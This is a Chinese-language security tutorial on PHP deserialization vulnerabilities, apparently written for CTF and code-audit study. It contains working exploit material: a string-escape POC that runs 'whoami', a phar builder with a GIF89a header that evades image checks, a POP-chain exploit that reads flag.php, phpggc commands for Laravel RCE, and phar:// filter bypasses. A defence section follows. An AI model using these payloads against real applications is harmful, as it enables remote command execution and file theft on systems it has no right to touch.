# 反序列漏洞-PHP

## 一句话理解
PHP 反序列化漏洞的本质，是应用把用户可控数据传给 `unserialize()` 后，攻击者借助目标类中的魔术方法、危险调用点或已有 POP 链，在对象恢复和销毁过程中触发敏感操作。

## 成立条件
通常需要同时具备以下条件：
1. 存在可控的反序列化入口，例如 `unserialize($_GET['data'])`
2. 目标环境中存在可利用的类、魔术方法或可拼接的 POP 链

## 漏洞成因
典型示例：

```php
class VulnerableClass {
    private $data;

    public function __destruct() {
        system($this->data);
    }
}

$obj = unserialize($_GET['data']);
```

如果攻击者能控制 `$data` 对象属性，就可能在析构阶段触发命令执行。

## 序列化基础
### 1. 序列化格式
示例：

```php
<?php
class test
{
    private $flag = "flag{233}";
    public $a = "aaa";
    static $b = "bbb";
}

$test = new test;
$data = serialize($test);
echo $data;
?>
```

序列化结果示意：

```text
O:4:"test":2:{s:10:"testflag";s:9:"flag{233}";s:1:"a";s:3:"aaa";}
O:<class_name_length>:"<class_name>":<number_of_properties>:{<properties>}
```

### 2. 需要关注的点
- 类名
- 属性数量
- 属性可见性
- 属性名长度
- 值类型与长度

> 私有属性和受保护属性在序列化结果中会带上特殊前缀，构造 payload 时需要特别注意。

## 常见利用目标
- 文件删除、文件读取、文件写入
- 命令执行
- 任意函数调用
- SSRF
- 包含链利用
- 与 `phar://`、文件上传、LFI 联动

## 利用思路
可以把 PHP 反序列化理解为“从可控对象出发，沿着已有类的方法调用关系拼接出危险执行路径”。

典型步骤：
1. 找到可控反序列化入口
2. 枚举已加载类和魔术方法
3. 找危险函数点，如 `system`、`eval`、`include`、文件操作、回调调用
4. 倒推需要满足的属性和值
5. 构造触发链并验证执行时机

这类链通常称为 POP 链（Property-Oriented Programming）。

## 常见魔术方法
### 1. 高价值触发点
- `__wakeup()`
- `__destruct()`
- `__toString()`
- `__invoke()`
- `__call()`
- `__callStatic()`
- `__get()`
- `__set()`

### 2. 常见魔术方法列表
- `__construct()`：构造函数
- `__destruct()`：析构函数
- `__call()`：调用不可访问方法时触发
- `__callStatic()`：静态调用不可访问方法时触发
- `__get()`：读取不可访问属性时触发
- `__set()`：写入不可访问属性时触发
- `__isset()`：对不可访问属性做 `isset/empty` 时触发
- `__unset()`：对不可访问属性做 `unset` 时触发
- `__sleep()`：执行 `serialize()` 时触发
- `__wakeup()`：执行 `unserialize()` 时触发
- `__toString()`：对象转字符串时触发
- `__invoke()`：对象当函数调用时触发
- `__set_state()`：`var_export()` 导出时触发
- `__clone()`：对象克隆时触发
- `__autoload()`：尝试加载未定义类
- `__debugInfo()`：调试输出时触发

## 常见入口点
### 1. `unserialize()`
最直接的入口，也是最常见的审计点。

### 2. `phar://` 反序列化
很多文件操作函数在处理 `phar://` 路径时，会解析 Phar 元数据，从而触发反序列化。

典型组合：
- 文件上传
- 构造 Phar
- 通过文件操作函数触发
- 配合 POP 链利用

- [利用 phar 拓展 php 反序列化漏洞攻击面](https://paper.seebug.org/680/)

## 常见审计点
### 1. 危险函数
重点关注链末端是否能触达：
- `system`
- `exec`
- `passthru`
- `shell_exec`
- `eval`
- `assert`
- `include` / `require`
- 文件读写删除函数
- 回调函数，如 `call_user_func`

### 2. 触发时机
并不是只有 `__wakeup()` 能触发，很多链真正生效是在：
- 脚本结束时的 `__destruct()`
- 字符串拼接时的 `__toString()`
- 间接回调中的 `__invoke()`

### 3. 自动加载
如果类不存在但存在自动加载器，也可能扩大可利用面。

## 常见绕过技巧
### 1. 跳过 `__wakeup()`
- [php 反序列化中 wakeup 绕过总结](https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/)

#### CVE-2016-7124
当序列化字符串中声明的属性个数大于真实属性个数时，某些版本中可跳过 `__wakeup()`：

```text
构造序列化对象：O:5:"SoFun":1:{S:7:"\00*\00file";s:8:"flag.php";}
绕过 __wakeup：O:5:"SoFun":2:{S:7:"\00*\00file";s:8:"flag.php";}
```

### 2. 引用赋值与对象关系利用
PHP 序列化支持引用，很多题目和真实场景会利用引用关系改变触发顺序或对象状态。

### 3. Fast-destruct
通过对象嵌套、异常流程或引用处理，让析构更早触发，从而绕过某些限制。

### 4. 序列化字符串拼接与字符逃逸
当序列化内容的一部分可控时，可能通过长度错位、字符填充影响后续结构。

相关资料：
- [从一道 CTF 看 PHP 反序列化漏洞的应用场景](https://www.cnblogs.com/litlife/p/11690918.html)

![](https://img2018.cnblogs.com/blog/1077935/201910/1077935-20191017112220979-1117655826.png)

### 5. 绕过正则检测
有些业务只用类似 `/O:\d:/` 的弱正则判断对象序列化格式，这类限制经常可以被变形绕过，例如：
- `O:+8`
- 大小写与编码差异
- 其他类型包装后再还原

- [红日安全代码审计 Day11 - unserialize 反序列化漏洞](https://xz.aliyun.com/t/2733)

## 字符逃逸详解

上文「绕过技巧」中提到的字符逃逸，这里展开讲透。其本质是：PHP 按**长度声明**逐段读取（`s:LEN:"..."` 中的 LEN 决定要读多少个字符），而不是靠引号或分隔符界定边界。当业务在 `serialize()` **之后**又对序列化串做替换/过滤，且替换前后长度不同，声明长度与实际内容就脱节了：

- **变长逃逸**：过滤后内容比声明长（如 `bb` → `ccc`），多出来的字符被"顶出"声明范围，被解析器当作后续结构 → 适合**注入**新键值、新对象
- **变短逃逸**：过滤后内容比声明短（如 `php` → `[]`），声明长度吃不满，会把**后面的结构字符吞进字符串值** → 适合**吞掉**原键名，让注入内容顶位

共同前提：先序列化后过滤 + 存在一个完全可控的属性作"膨胀/收缩"载体。

### 1. 变长逃逸完整例题

题目环境（filter 把 `bb` 替换成 `ccc`，每替换一次净增 1 字符）：

```php
<?php
// ===== 题目环境 =====
class Evil {
    public $cmd;
    public function __destruct() {
        system($this->cmd);            // 链末端危险点：反序列化出 Evil 对象即可命令执行
    }
}

class User {
    public $name;
    public $pass;
    public function __construct($n, $p) {
        $this->name = $n;
        $this->pass = $p;
    }
}

// 过滤函数：bb -> ccc，2 字符膨胀为 3 字符，每替换一次净增 1 字符
function filter($str) {
    return str_replace('bb', 'ccc', $str);
}

// name 完全可控；pass 被业务校验锁死，无法直接注入对象
$name = $_GET['name'] ?? '';
$pass = $_GET['pass'] ?? '123456';

// 关键：先序列化、后过滤 → 长度声明与实际内容脱节
$ser = filter(serialize(new User($name, $pass)));
unserialize($ser);
?>
```

构造过程（四步）：

**第 1 步：看正常结构。** `name=1&pass=2` 时的序列化结果：

```text
O:4:"User":2:{s:4:"name";s:1:"1";s:4:"pass";s:1:"2";}
```

**第 2 步：找膨胀单位。** name 中每放 1 组 `bb`，过滤后净增 1 字符，但 `s:L` 声明不变——解析器读完 L 个字符就"提前收口"，多出的字符会顶替 name 值的闭引号，成为后续结构的一部分。

**第 3 步：写逃逸结构。** 目标是把一个 Evil 对象注入反序列化作用域，并提前闭合外层 User（unserialize 解析完第一个完整对象即返回，尾部多余字符不再处理；即使解析器对尾部垃圾报错，注入对象也已构造完成并随之销毁，`__destruct` 照常触发）：

```text
";i:1;O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}}
```

- `";` —— 顶替 name 值的闭引号，让 name 正常闭合
- `i:1;` —— 作为第二个属性的 key（值随便，只求结构合法）
- `O:4:"Evil":1:{...}` —— 逃逸对象本体
- 结尾 `}` —— 提前闭合 User，让原本的 `";s:4:"pass";...}` 作废

注意：逃逸结构内部**不能出现 `bb`**，否则会被 filter 二次替换破坏长度计算。

**第 4 步：按长度配平。** 逃逸结构长 45 字符，就需要 45 组 `bb`（每组净增 1，正好把 45 个字符全部顶出声明长度）。

完整 POC（本地可运行，逐步展示过程）：

```php
<?php
// ===== 服务端环境模拟 =====
class Evil {
    public $cmd;
    public function __destruct() {
        system($this->cmd);
    }
}
class User {
    public $name;
    public $pass;
    public function __construct($a, $b) { $this->name = $a; $this->pass = $b; }
}
function filter($str) {
    return str_replace('bb', 'ccc', $str);   // 变长过滤：2 字符 -> 3 字符
}

// ===== 攻击端：本地构造 payload =====

// 第 3 步的逃逸结构（长度恰为 45）
$inject = '";i:1;O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}}';

// 第 4 步：结构多长就补多少组 bb
$n = strlen($inject);               // 45
$padding = str_repeat('bb', $n);    // 45 组 bb = 90 个 b

// 拼出最终提交的 name
$name = $padding . $inject;         // 原始长度 135 = 90 + 45
$pass = '123456';                   // pass 随意，反正会被作废

// ===== 模拟服务端处理流程 =====
$ser1 = serialize(new User($name, $pass));
echo "[过滤前] $ser1\n";
$ser2 = filter($ser1);
echo "[过滤后] $ser2\n";
unserialize($ser2);   // 触发 Evil::__destruct → 执行 whoami
```

关键数字推演：

```text
name 原始值 = bb*45（90 字符）+ 逃逸结构（45 字符）= 135 字符
序列化声明  = s:135:"..."
过滤后实际  = ccc*45（135 字符）+ 逃逸结构（45 字符）= 180 字符
解析器按 s:135 读取 → 恰好读完 135 个 c，逃逸结构整体"溢出"
溢出的 ";i:1;O:4:"Evil":...}} 被当作 name 之后的合法结构解析
→ Evil 对象成功进入 unserialize 作用域，销毁时触发 __destruct
```

提交时对 name 做 URL 编码：

```text
?name=<bb*45>";i:1;O:4:"Evil":1:{s:3:"cmd";s:6:"whoami";}}>&pass=123456
```

### 2. 变短逃逸

一句话思路：过滤让内容**变短**（如 `php` → `[]`，5 字符变 2 字符，每替换一次净减 3），声明长度吃不满，反序列化会把后面的结构字符（如 pass 的键名 `s:4:"pass";`）**吞进** name 的字符串值里，从而把注入的键值对顶到 pass 的位置。

构造口诀：**变长靠"顶"（膨胀注入），变短靠"吞"（收缩腾位）**，配平逻辑与变长完全对称。

例题指引：[安洵杯 2019]easy_serialize_php —— filter 把 `php` 替换为 `[]`，利用 `$_SESSION` 键值逃逸控制反序列化结果读取 flag，BUUOJ 可复现，是变短逃逸的标准教学题。

## phar 利用

`phar://` 是把反序列化攻击面从"字符串参数"扩展到"文件路径"的关键武器：phar 文件的元数据（metadata）以 PHP 序列化格式存储，文件操作函数通过 `phar://` 协议访问时会自动解析 metadata，等于隐式调用了 `unserialize()`。

### 1. 前提与版本

- **生成** phar 文件需要本地 php.ini 设置 `phar.readonly=Off`（默认 On）
- **利用**时不受目标机 `phar.readonly` 影响：该选项只限制生成/修改 phar，读取解析 metadata 不受影响
- 版本注意：**PHP 8.0 起 `phar.readonly=On` 时不再反序列化 phar 元数据**（官方安全加固），实战利用前提变为目标 PHP < 8.0，或目标环境显式关闭了 readonly

### 2. 生成 phar 文件

```php
<?php
class Test { public $cmd = 'system("id");'; }   // 目标类：与题目环境中的类同名同结构

$phar = new Phar('test.phar');
$phar->startBuffering();
// GIF89a 头用于绕过文件类型检测；__HALT_COMPILER(); 是 phar 格式标识，不可省略
$phar->setStub('GIF89a' . '<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Test());                 // metadata 即反序列化入口，放恶意对象/POP 链头
$phar->addFromString('test.txt', 'test');       // 至少包含一个文件，phar 结构才完整
$phar->stopBuffering();
```

要点：
- stub 前半段可换成任意文件头（GIF89a / `\x89PNG` 等），用于骗过 `getimagesize`、`exif_imagetype`、MIME 白名单
- metadata 存的是 `serialize(new Test())` 的结果，触发时被 `unserialize` 还原，POP 链在服务端环境里跑
- 生成后可随意改后缀（`.gif`/`.jpg`），phar 识别不看扩展名

### 3. 受 phar 影响的文件操作函数清单

只要函数最终走 PHP 流封装层访问 `phar://` 路径，就可能触发 metadata 反序列化：

| 类别 | 函数 |
| --- | --- |
| 存在性/元信息 | `file_exists`、`is_file`、`is_dir`、`is_link`、`is_readable`、`is_writable`、`is_executable`、`stat`、`lstat`、`fileperms`、`filetype`、`filesize`、`fileinode`、`fileowner`、`filegroup` |
| 时间 | `fileatime`、`filectime`、`filemtime`、`touch` |
| 读写 | `fopen`、`fread`、`fwrite`、`file_get_contents`、`file_put_contents`、`readfile` |
| 哈希 | `md5_file`、`sha1_file`、`hash_file`、`hash_hmac_file`、`hash_update_file` |
| 目录操作 | `opendir`、`scandir`、`readdir`、`glob`、`mkdir`、`rmdir`、`rename`、`unlink`、`copy` |
| 类型识别 | `getimagesize`、`exif_imagetype`、`imageloadfont`、`get_headers` |
| MIME/解析 | `finfo_file`、`finfo_buffer`、`mime_content_type`、`parse_ini_file`、`get_meta_tags` |
| 上传 | `move_uploaded_file` |

最常用的高频触发点：`file_exists`、`is_dir`、`filesize`、`fopen`、`md5_file`、`getimagesize`、`finfo_file`、`exif_imagetype`。

### 4. 完整场景：上传点只允许图片 + file_exists 触发

场景代码：

```php
<?php
// 1. 上传点：getimagesize 校验，只允许 gif/jpg/png
// 2. 上传成功后文件落盘 /upload/<md5>.gif，路径已知
// 3. "检测文件"功能把用户输入拼进 file_exists
class ReadFlag {
    public $file;
    public function __destruct() {
        echo file_get_contents($this->file);   // 假想的危险点：析构时读文件并回显
    }
}

$path = $_GET['path'] ?? '';
if (file_exists($path)) {          // 触发点：phar:// 流解析 metadata
    echo "file exists";
}
```

利用流程：

```text
1. 本地 php.ini 设 phar.readonly=Off，生成带 GIF89a 头、metadata 为 new ReadFlag 的 phar
   （ReadFlag->file = 'flag.php'，与题目环境类同名同结构）
2. 改名为 evil.gif 上传 → getimagesize 只看文件头，GIF89a 通过校验 → 得到路径 /upload/xxxx.gif
3. 访问 ?path=phar://./upload/xxxx.gif/test.txt
   → file_exists 走 phar:// 流 → 解析 metadata → 反序列化 ReadFlag 对象
4. 对象销毁时触发 __destruct → file_get_contents('flag.php') → 回显 flag
```

真实赛题指引：
- [CISCN2019 华北赛区 Day1 Web1]Dropbox：上传图片 + `phar://` + POP 链（借文件删除功能拿 flag），BUUOJ 可复现，phar 实战经典
- 其余搜索关键词：`phar 反序列化 writeup`、`file_exists phar`，多届国赛/强网杯均有变体

### 5. 常见对抗点

- 过滤 `phar://` 关键字：`compress.zlib://phar://xxx.gif` / `compress.bzip2://phar://xxx.gif` 外面再包一层流协议；协议名不区分大小写（`Phar://`）
- 过滤 `__HALT_COMPILER` 明文（部分题目检测上传内容）：把 phar 用 gzip 压缩后再以 `compress.zlib://phar://` 访问，绕过明文特征匹配

## 常见框架 POP 链

实战中"可控 unserialize 入口 + 框架/组件 gadget"是最常见的组合。**首选工具 phpGGC**（PHP Generic Gadget Chains），内置主流框架与组件的反序列化链，一条命令生成 payload：

- GitHub：<https://github.com/ambionics/phpggc>

常用命令：

```bash
phpggc -l                          # 列出全部可用链
phpggc Laravel/RCE1 system id      # 生成 Laravel RCE1 链 payload
phpggc -b Laravel/RCE1 system id   # base64 输出，方便塞进参数
# phar 输出相关选项（生成带文件头的 phar 载荷）以 phpggc --help 为准
```

三大高频目标：

### 1. Laravel
- phpGGC 链：`Laravel/RCE1` ~ `RCE12`，覆盖 5.x / 6.x / 7.x 多个版本
- 点名：**Laravel Debug 模式 RCE（CVE-2021-3129）**——`_ignition/executeSolution` 接口 + `php://filter` 写日志配合 phar/log 中转触发反序列化（Facade\Ignition < 2.5.2 / Laravel < 8.4.2），本质仍是 phpGGC 的 Laravel gadget 链
- 审计入口：session/缓存驱动（redis/memcached 序列化配置）、cookie 加密失效点、Ignition 路由

### 2. ThinkPHP
- tp5.x：phpGGC `ThinkPHP/RCE1` ~ `RCE6`；多数链从 `think\process\pipes\Windows::__destruct`（`removeFiles`）或 `think\model\Pivot` 出发
- 经典主线一句话：**Windows pipes 析构 → 触发 `__toString` → `think\model` 的 `toArray()` → `think\Request::input` 中的 `call_user_func`**
- tp6+：依赖结构有变化，同样优先翻 phpGGC 列表再自己倒推

### 3. WordPress
- 核心对用户输入直接 unserialize 的入口较少，风险集中在**插件**：重点搜插件源码中的 `unserialize($_GET/$_POST/$_COOKIE...)`
- 核心 `maybe_unserialize()` 处理 option/usermeta 等数据库字段：若能控制数据库写入（如 SQL 注入）即可二次利用
- phpGGC 中 WordPress 相关链依赖特定插件/版本（`phpggc -l` 过滤查看），没有现成链时按入口审计

工具优先级总结：先 `phpggc -l` 看目标框架有没有现成链 → 没有 → 自己从 `__destruct/__wakeup` 倒推 → 配合 composer 依赖版本翻 CVE。

## 实战技巧
### 1. 动态调用
有些链条会利用数组回调、可调用对象等机制：

```php
<?php
class A {
    public function test() {
        echo "aaaa";
    }
}
$tr = array(new A(), "test");
$tr();
```

### 2. 自动加载类
某些情况下，`unserialize()` 后会进入自动加载逻辑，从而扩大可利用类范围。

- [国赛 2020 WriteUp](https://blog.csdn.net/qq_42697109/article/details/108212765)

## 完整例题：纯 PHP POP 链

题目源码：

```php
<?php
// flag.php: <?php $flag = 'flag{p0p_1s_e4sy}'; ?>
highlight_file(__FILE__);

class Start {
    public $data;
    public function __destruct() {
        unserialize($this->data);        // ① 二次反序列化
    }
}

class Test {
    public $name;
    public function __wakeup() {
        echo "Hello, " . $this->name;    // ② 字符串拼接触发 __toString
    }
}

class Show {
    public $cmd;
    public function __toString() {
        system($this->cmd);              // ③ 链尾命令执行
        return "CTF";
    }
}

unserialize($_GET['pop']);
```

从后往前倒推链条：

```text
1. 链尾 Show::__toString 执行 system → 需要 Show 对象被"字符串化"
2. Test::__wakeup 里 "Hello, " . $this->name → 让 name = Show 实例即可触发
3. Test::__wakeup 需要 Test 对象被反序列化 → Start::__destruct 里恰好有 unserialize($this->data)
   → 把 Test 的序列化串塞进 data（二次反序列化）
4. Start::__destruct 何时触发？unserialize($_GET['pop']) 的返回值没有赋值给变量
   → 语句执行完毕立即销毁 → 自动触发析构，无需额外条件
```

exp（本地生成 payload）：

```php
<?php
// exp.php —— 本地运行
class Start { public $data; }
class Test  { public $name; }
class Show  { public $cmd;  }

$show = new Show();
$show->cmd = 'tac flag.php';        // flag 藏在 php 源码里时，tac/cat 直接吐出内容

$test = new Test();
$test->name = $show;                // __wakeup 拼接时触发 Show::__toString

$start = new Start();
$start->data = serialize($test);    // 关键：内层是 Test 的"序列化字符串"，二次反序列化才生效

echo urlencode(serialize($start));
```

最终 payload 串（未编码形式）：

```text
O:5:"Start":1:{s:4:"data";s:71:"O:4:"Test":1:{s:4:"name";O:4:"Show":1:{s:3:"cmd";s:12:"tac flag.php";}}";}
```

> 内层串 `O:4:"Test":1:{s:4:"name";O:4:"Show":1:{s:3:"cmd";s:12:"tac flag.php";}}` 共 71 字符，作为外层 `s:71` 的字符串值嵌入；提交时记得整体 URL 编码。

执行流程串讲：

```text
unserialize($_GET['pop'])
 └─ 恢复 Start 实例（返回值未赋值 → 语句结束即销毁）
     └─ Start::__destruct → unserialize($this->data)      [二次反序列化]
         └─ 恢复 Test 实例 → Test::__wakeup
             └─ "Hello, " . Show 实例 → Show::__toString
                 └─ system('tac flag.php') → 吐出 flag
```

考点回顾：
- 二次反序列化（析构里再 unserialize）
- `__wakeup` → 拼接触发 `__toString` 的经典衔接
- 返回值未赋值 → 语句结束立即析构（Fast-destruct 思想的入门形态）

## 实战排查思路
### 1. 先找入口
高频点：
- Cookie
- Session
- GET / POST 参数
- 缓存字段
- 队列消息
- 文件内容
- Phar 文件路径

### 2. 再找可利用类
重点看：
- 框架类
- 依赖包类
- 文件系统相关类
- 日志、模板、数据库、缓存组件

### 3. 最后拼链
从危险函数往回逆推，比从入口正向乱试更高效。

## 防御要点
### 1. 不要对不可信数据使用 `unserialize()`
这是最根本的防御。

### 2. 优先使用安全数据格式
例如 JSON，只反序列化纯数据，不恢复对象行为。

### 3. 启用白名单
如果必须反序列化对象，使用允许类白名单，限制可实例化对象范围。

### 4. 减少危险魔术方法
避免在 `__destruct()`、`__wakeup()`、`__toString()` 中做高风险操作。

### 5. 谨慎处理 `phar://`
上传、文件操作、包含链应评估 Phar 元数据带来的反序列化面。

## 速查清单
- 先找 `unserialize()` 和 `phar://` 入口
- 先枚举魔术方法，再找危险函数和可控属性
- 关注 `__destruct()`、`__toString()`、`__invoke()` 等延迟触发点
- 检查是否存在类自动加载、依赖包 gadget、文件操作链
- 检查是否能与上传、包含、日志、Session、Phar 组合利用

## Reference
- [PHP 反序列化由浅入深](https://xz.aliyun.com/t/3674)
- [php 反序列化 POP 链的构造与理解](https://blog.szfszf.top/tech/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE%E7%9A%84%E6%9E%84%E9%80%A0%E4%B8%8E%E7%90%86%E8%A7%A3/)
- [phpGGC - PHP 反序列化 gadget 链生成工具](https://github.com/ambionics/phpggc)
- [y4tacker 博客 - PHP 反序列化 / phar 大量实战](https://blog.csdn.net/solitudi)
- [先知社区 phar 主题文章合集](https://xz.aliyun.com/?tag=phar)
